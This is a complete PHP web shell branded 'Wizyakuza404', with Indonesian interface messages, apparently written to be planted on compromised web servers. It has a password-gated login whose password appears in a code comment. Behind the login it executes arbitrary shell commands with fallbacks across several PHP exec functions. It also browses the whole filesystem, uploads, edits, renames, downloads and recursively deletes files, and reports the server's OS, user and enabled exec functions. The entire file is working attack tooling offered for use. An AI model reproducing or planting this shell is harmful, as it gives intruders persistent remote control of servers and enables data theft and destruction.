<?php
/**
 * Wizyakuza404 SHELL - SYSTEM INFO & NOTIF EDITION
 */
error_reporting(0);
session_start();

$correct_password_hash = '$2a$12$1zQVKb7H4KYHvo2UIbQlAea7Pj/vKN02Pj/UPc6hFD6cnBJENul0W'; // 'kominfo'

// --- Autentikasi ---
if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], $correct_password_hash)) {
            $_SESSION['auth'] = true;
            header("Location: ?"); exit;
        } else { $login_error = "Incorrect password."; }
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Login - CyberShell</title>
        <style>
            body { font-family: sans-serif; background: #050505; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login { background: #0d1110; padding: 30px; border-radius: 10px; border: 1px solid #1f3a2f; text-align: center; box-shadow: 0 0 20px rgba(0,255,136,0.2); }
            input { padding: 10px; border-radius: 5px; border: 1px solid #1f3a2f; background: #000; color: #0f8; width: 200px; text-align: center; }
            button { padding: 10px 20px; background: #008f58; color: #fff; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 10px; }
        </style>
    </head>
    <body>
        <div class="login">
            <h2 style="color:#0f8">Wizyakuza404 LOGIN</h2>
            <form method="POST">
                <input type="password" name="password" placeholder="Password" required><br>
                <button type="submit">ACCESS SYSTEM</button>
            </form>
            <?php if(isset($login_error)) echo "<p style='color:red'>$login_error</p>"; ?>
        </div>
    </body>
    </html>
    <?php exit;
}

if (isset($_GET['logout'])) { session_destroy(); header("Location: ?"); exit; }

// --- Status Manager ---
$status_msg = '';
function set_msg($m, $success = true) {
    global $status_msg;
    $color = $success ? '#00ff88' : '#ff4444';
    $status_msg = "<div style='padding:10px; background:rgba(0,0,0,0.7); border:1px solid $color; color:$color; margin-bottom:15px; border-radius:5px; text-align:center; font-weight:bold;'>$m</div>";
}

// --- Path Manager ---
$current_path = isset($_GET['d']) ? realpath($_GET['d']) : realpath(__DIR__);
if (!$current_path || !is_dir($current_path)) $current_path = realpath(__DIR__);
$current_path = str_replace('\\', '/', $current_path);

// --- Hybrid Command Executor ---
function run_cmd($cmd) {
    $out = '';
    if (function_exists('shell_exec')) { $out = shell_exec($cmd . ' 2>&1'); } 
    elseif (function_exists('passthru')) { ob_start(); passthru($cmd . ' 2>&1'); $out = ob_get_contents(); ob_end_clean(); } 
    elseif (function_exists('system')) { ob_start(); system($cmd . ' 2>&1'); $out = ob_get_contents(); ob_end_clean(); } 
    elseif (function_exists('exec')) { exec($cmd . ' 2>&1', $o); $out = implode("\n", $o); }
    return $out;
}

// --- Handle POST Actions ---
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['file'])) {
        if(@move_uploaded_file($_FILES['file']['tmp_name'], $current_path . '/' . $_FILES['file']['name'])) set_msg("Upload Berhasil!");
        else set_msg("Upload Gagal!", false);
    } elseif (isset($_POST['create_folder_name'])) {
        if(@mkdir($current_path . '/' . $_POST['create_folder_name'], 0755, true)) set_msg("Folder Berhasil Dibuat!");
        else set_msg("Gagal Membuat Folder!", false);
    } elseif (isset($_POST['create_file_name'])) {
        $new_file = $current_path . '/' . $_POST['create_file_name'];
        if(@file_put_contents($new_file, '')) {
            header("Location: ?d=" . urlencode($current_path) . "&edit=" . urlencode($new_file) . "&msg=created");
            exit;
        } else { set_msg("Gagal Membuat File!", false); }
    } elseif (isset($_POST['new_name']) && isset($_POST['old_name'])) {
        if(@rename($_POST['old_name'], $current_path . '/' . $_POST['new_name'])) set_msg("Rename Berhasil!");
        else set_msg("Rename Gagal!", false);
    } elseif (isset($_POST['command'])) {
        chdir($current_path);
        $command_output = run_cmd($_POST['command']);
    } elseif (isset($_POST['content']) && isset($_GET['edit'])) {
        if(@file_put_contents($_GET['edit'], $_POST['content'])) set_msg("File Berhasil Disimpan!");
        else set_msg("Gagal Menyimpan File!", false);
    }
}

// --- Handle Delete & Download ---
if (isset($_GET['del'])) {
    $target = $_GET['del'];
    $res = false;
    if (is_dir($target)) { run_cmd("rm -rf " . escapeshellarg($target)); $res = !is_dir($target); }
    else { $res = @unlink($target); }
    
    if($res) header("Location: ?d=" . urlencode($current_path) . "&msg=deleted");
    else header("Location: ?d=" . urlencode($current_path) . "&msg=err_del");
    exit;
}

// Handle Pesan dari Redirect
if(isset($_GET['msg'])) {
    if($_GET['msg'] == 'created') set_msg("File Berhasil Dibuat!");
    if($_GET['msg'] == 'deleted') set_msg("Item Berhasil Dihapus!");
    if($_GET['msg'] == 'err_del') set_msg("Gagal Menghapus Item!", false);
}

if (isset($_GET['download'])) {
    $file = $_GET['download'];
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    readfile($file); exit;
}

function format_size($b) {
    if ($b >= 1048576) return round($b / 1048576, 2) . ' MB';
    if ($b >= 1024) return round($b / 1024, 2) . ' KB';
    return $b . ' B';
}

// --- Info System Helper ---
function check_func($f) {
    return function_exists($f) ? "<span style='color:#0f8'>ON</span>" : "<span style='color:#f44'>OFF</span>";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Wizyakuza404 V3 - System Info</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <style>
        :root { --g: #00ff88; --bg: #050505; --card: #0d1110; --border: #1f3a2f; }
        body { font-family: 'Consolas', monospace; background-color: var(--bg); color: #ccc; margin: 0; }
        .header { background-color: #000; padding: 10px 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .container { padding: 20px; max-width: 1400px; margin: auto; }
        
        /* System Info Style */
        .sys-info { background: var(--card); padding: 10px 15px; border: 1px solid var(--border); border-radius: 5px; margin-bottom: 15px; display: flex; flex-wrap: wrap; gap: 20px; font-size: 11px; }
        .sys-info div { border-right: 1px solid #1a2a22; padding-right: 20px; }
        .sys-info div:last-child { border: none; }
        
        .path-bar { background: var(--card); padding: 10px; margin-bottom: 15px; border-radius: 5px; color: var(--g); border: 1px solid var(--border); font-size: 12px;}
        .forms-container { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 15px; }
        .form-section { background: var(--card); padding: 12px; border-radius: 8px; flex: 1; min-width: 180px; border: 1px solid var(--border); }
        h4 { margin: 0 0 10px 0; font-size: 11px; text-transform: uppercase; color: var(--g); border-bottom: 1px solid #1a2a22; padding-bottom: 5px;}
        input[type="text"], input[type="file"] { width: 100%; padding: 6px; margin-bottom: 8px; background: #000; color: var(--g); border: 1px solid var(--border); box-sizing: border-box; font-size: 12px; border-radius: 4px; }
        table { width: 100%; border-collapse: collapse; background: var(--card); border: 1px solid var(--border); }
        th, td { padding: 8px 12px; border-bottom: 1px solid var(--border); text-align: left; }
        th { background: #000; color: var(--g); font-size: 12px; }
        .btn { padding: 4px 8px; background: #008f58; color: #fff; text-decoration: none; border-radius: 3px; font-size: 11px; cursor: pointer; border: none; }
        .danger { background: #600; }
        .rename-btn { background: #0055ff; }

        /* Terminal UI */
        .terminal-container { background: #000; border: 1px solid var(--g); border-radius: 5px; margin-bottom: 15px; }
        .cmd-box { padding: 15px; max-height: 250px; overflow-y: auto; font-size: 13px; color: #0f8; white-space: pre-wrap; margin: 0; }
        .terminal-input-row { display: flex; align-items: center; padding: 5px 15px; background: #000; border-top: 1px solid var(--border); }
        .terminal-input-row span { color: var(--g); font-weight: bold; margin-right: 10px; }
        .terminal-input-row input { border: none !important; margin: 0 !important; flex-grow: 1; outline: none; background: transparent !important; }
    </style>
</head>
<body>
    <div class="header">
        <h2 style="margin:0; color:var(--g); font-size: 18px; letter-spacing: 2px;">Wizyakuza404 V3</h2>
        <a href="?logout" style="color: #ff4444; text-decoration: none; font-size: 12px;"><i class="fas fa-power-off"></i> LOGOUT</a>
    </div>

    <div class="container">
        <div class="sys-info">
            <div><b>OS:</b> <?= php_uname() ?></div>
            <div><b>USER:</b> <?= get_current_user() ?> (<?= getmyuid() ?>)</div>
            <div><b>PHP:</b> <?= phpversion() ?></div>
            <div><b>FUNCS:</b> 
                exec: <?= check_func('exec') ?> | 
                shell_exec: <?= check_func('shell_exec') ?> | 
                system: <?= check_func('system') ?> | 
                passthru: <?= check_func('passthru') ?>
            </div>
        </div>

        <?= $status_msg ?>

        <div class="terminal-container">
            <?php if (isset($command_output)): ?>
                <pre class="cmd-box"><?= htmlspecialchars($command_output) ?></pre>
            <?php endif; ?>
            <form method="POST">
                <div class="terminal-input-row">
                    <span>$</span>
                    <input type="text" name="command" placeholder="Execute command..." autocomplete="off" autofocus>
                </div>
            </form>
        </div>

        <div class="path-bar">
            <strong>DIR:</strong> <?= htmlspecialchars($current_path) ?>
        </div>

        <div class="forms-container">
            <div class="form-section">
                <h4><i class="fas fa-upload"></i> Upload</h4>
                <form method="POST" enctype="multipart/form-data">
                    <input type="file" name="file"><button type="submit" class="btn">Upload</button>
                </form>
            </div>
            <div class="form-section">
                <h4><i class="fas fa-folder-plus"></i> New Dir</h4>
                <form method="POST">
                    <input type="text" name="create_folder_name" placeholder="Name..."><button type="submit" class="btn">Create</button>
                </form>
            </div>
            <div class="form-section">
                <h4><i class="fas fa-file-plus"></i> New File</h4>
                <form method="POST">
                    <input type="text" name="create_file_name" placeholder="file.php"><button type="submit" class="btn">Create & Edit</button>
                </form>
            </div>
        </div>

        <table>
            <thead>
                <tr>
                    <th>NAME</th>
                    <th width="80">SIZE</th>
                    <th width="180">ACTIONS</th>
                </tr>
            </thead>
            <tbody>
                <?php
                $parent = dirname($current_path);
                if ($current_path !== str_replace('\\', '/', $parent)) {
                    echo "<tr><td colspan='3'><a href='?d=".urlencode($parent)."' style='color:var(--g); text-decoration:none;'><i class='fas fa-level-up-alt'></i> .. [ Parent Directory ]</a></td></tr>";
                }

                $items = scandir($current_path);
                foreach ($items as $item) {
                    if ($item == '.' || $item == '..') continue;
                    $full_path = $current_path . '/' . $item;
                    $is_dir = is_dir($full_path);
                    
                    echo "<tr>";
                    echo "<td>" . ($is_dir ? "<i class='fas fa-folder' style='color:orange'></i> <a href='?d=".urlencode($full_path)."' style='color:#fff; text-decoration:none;'>$item</a>" : "<i class='fas fa-file' style='color:#888'></i> $item") . "</td>";
                    echo "<td>" . ($is_dir ? "DIR" : format_size(filesize($full_path))) . "</td>";
                    echo "<td>";
                    if (!$is_dir) {
                        echo "<a class='btn' href='?d=".urlencode($current_path)."&edit=".urlencode($full_path) . "'>Edit</a> ";
                        echo "<a class='btn' href='?download=".urlencode($full_path)."'>Down</a> ";
                    }
                    echo "<button class='btn rename-btn' onclick=\"renameItem('".addslashes($full_path)."', '".addslashes($item)."')\">Ren</button> ";
                    echo "<a class='btn danger' href='?d=".urlencode($current_path)."&del=".urlencode($full_path)."' onclick='return confirm(\"Hapus?\")'>Del</a>";
                    echo "</td>";
                    echo "</tr>";
                }
                ?>
            </tbody>
        </table>
    </div>

    <?php if (isset($_GET['edit']) && is_file($_GET['edit'])): ?>
    <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:100; padding:40px; box-sizing:border-box;">
        <h3 style="color:var(--g)">EDITING: <?= basename($_GET['edit']) ?></h3>
        <form method="POST">
            <textarea name="content" style="width:100%; height:80%; background:#000; color:#0f8; border:1px solid var(--border); padding:10px; font-family:monospace;"><?= htmlspecialchars(file_get_contents($_GET['edit'])) ?></textarea><br><br>
            <button type="submit" class="btn" style="padding:10px 20px;">SAVE FILE</button>
            <a href="?d=<?= urlencode($current_path) ?>" class="btn" style="background:#444; padding:10px 20px; text-decoration:none;">CLOSE</a>
        </form>
    </div>
    <?php endif; ?>

    <script>
        function renameItem(oldPath, oldName) {
            var newName = prompt("Rename '" + oldName + "' to:", oldName);
            if (newName) {
                var form = document.createElement("form");
                form.method = "POST";
                form.innerHTML = '<input type="hidden" name="old_name" value="' + oldPath + '">' +
                                 '<input type="hidden" name="new_name" value="' + newName + '">';
                document.body.appendChild(form);
                form.submit();
            }
        }
        var box = document.querySelector('.cmd-box');
        if(box) box.scrollTop = box.scrollHeight;
    </script>
</body>
</html>
